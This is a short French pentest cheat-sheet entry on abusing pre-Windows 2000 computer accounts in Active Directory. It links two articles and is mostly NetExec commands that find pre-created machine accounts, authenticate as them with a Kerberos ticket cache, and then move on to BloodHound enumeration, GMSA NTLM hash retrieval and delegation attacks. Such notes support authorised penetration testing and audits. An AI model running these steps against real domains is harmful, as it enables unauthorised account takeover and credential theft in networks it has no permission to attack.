# Pre-Windows 2000
## Articles

- https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers
- https://www.hackingarticles.in/pre2k-active-directory-misconfigurations/

## Exemple d'exploitation avec NetExec

```
sudo ntpdate -u $DOMAINE    # Synchronisation si besoin

netexec ldap $IP -d $DOMAINE -u $USER -p $PASSWORD -M pre2k    

# Voir si des lignes au format suivant apparaissent dans les résultats : 
	# Pre-created computer account: MACHINE01$

sudo KRB5CCNAME=/home/timothe/.nxc/modules/pre2k/ccache/machine01.ccache nxc ldap $DOMAINE -u MACHINE01 --use-kcache
```

Le succès de ces premières étapes ouvre d'autres possibilités : 
- Énumération avec "--bloodhound" depuis la perspective du compte machine
- Récupération d'un hash NTLM de compte GMSA avec "--gmsa"
- Utiliser d'autres modules LDAP de NetExec
- Exploitation d'autres vulnérabilités liées aux délégations
- ...
